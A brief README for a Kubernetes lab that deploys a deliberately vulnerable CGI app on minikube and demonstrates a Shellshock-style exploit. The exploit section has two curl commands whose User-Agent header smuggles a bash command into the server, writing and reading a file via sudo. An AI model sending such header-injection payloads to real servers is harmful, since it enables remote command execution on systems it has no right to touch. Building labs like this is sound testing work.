# How-to ?

## Kubernetes

Launch minikube :

```sh
minikube start --ports 8080:8080
```

Deploy the vulnerable app :

```sh
kubectl apply -f vuln.yaml
```

## Exploit

```sh
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo toto | sudo tee /test'" http://localhost:8080/cgi-bin/stats
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /test'" http://localhost:8080/cgi-bin/stats
```

